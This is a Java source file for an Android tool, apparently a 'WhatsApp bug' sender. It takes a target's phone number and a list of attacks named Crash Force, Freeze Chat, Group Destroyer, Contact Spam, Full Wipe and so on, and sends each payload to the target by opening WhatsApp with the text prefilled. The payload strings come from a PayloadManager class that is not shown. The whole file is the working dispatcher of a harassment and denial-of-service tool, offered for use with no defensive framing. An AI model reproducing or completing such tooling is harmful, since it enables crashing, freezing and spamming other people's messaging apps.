package com.droid.bug;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.widget.Toast;
import java.util.List;

public class BugEngine {

    private final Context context;
    private final PayloadManager payloadManager;

    public BugEngine(Context context) {
        this.context = context;
        this.payloadManager = new PayloadManager();
    }

    public void execute(String target, List<String> bugs) {
        Toast.makeText(context, "Droid launching on " + target, Toast.LENGTH_SHORT).show();

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            for (String bug : bugs) {
                switch (bug) {
                    case "Crash Force":
                        sendCrashPayload(target);
                        break;
                    case "Freeze Chat":
                        sendFreezePayload(target);
                        break;
                    case "Blank Message":
                        sendBlankPayload(target);
                        break;
                    case "Media Crash":
                        sendMediaCrash(target);
                        break;
                    case "Status Bug":
                        sendStatusBug(target);
                        break;
                    case "Group Destroyer":
                        sendGroupDestroy(target);
                        break;
                    case "Contact Spam":
                        sendContactSpam(target);
                        break;
                    case "Typing Loop":
                        sendTypingLoop(target);
                        break;
                    case "Last Seen Freeze":
                        sendLastSeenFreeze(target);
                        break;
                    case "Full Wipe":
                        sendFullWipe(target);
                        break;
                }
            }
            Toast.makeText(context, "All payload sent", Toast.LENGTH_LONG).show();
        }, 800);
    }

    private void openWhatsApp(String number, String text) {
        try {
            String url = "https://wa.me/" + number + "?text=" + Uri.encode(text);
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse(url));
            i.setPackage("com.whatsapp");
            context.startActivity(i);
        } catch (Exception e) {
            Toast.makeText(context, "WhatsApp not installed", Toast.LENGTH_SHORT).show();
        }
    }

    private void sendCrashPayload(String target) {
        String payload = payloadManager.getCrashPayload();
        openWhatsApp(target, payload);
    }

    private void sendFreezePayload(String target) {
        String payload = payloadManager.getFreezePayload();
        openWhatsApp(target, payload);
    }

    private void sendBlankPayload(String target) {
        String payload = payloadManager.getBlankPayload();
        openWhatsApp(target, payload);
    }

    private void sendMediaCrash(String target) {
        String payload = payloadManager.getMediaCrashPayload();
        openWhatsApp(target, payload);
    }

    private void sendStatusBug(String target) {
        String payload = payloadManager.getStatusBugPayload();
        openWhatsApp(target, payload);
    }

    private void sendGroupDestroy(String target) {
        String payload = payloadManager.getGroupDestroyPayload();
        openWhatsApp(target, payload);
    }

    private void sendContactSpam(String target) {
        String payload = payloadManager.getContactSpamPayload();
        openWhatsApp(target, payload);
    }

    private void sendTypingLoop(String target) {
        String payload = payloadManager.getTypingLoopPayload();
        openWhatsApp(target, payload);
    }

    private void sendLastSeenFreeze(String target) {
        String payload = payloadManager.getLastSeenPayload();
        openWhatsApp(target, payload);
    }

    private void sendFullWipe(String target) {
        String payload = payloadManager.getFullWipePayload();
        openWhatsApp(target, payload);
    }
}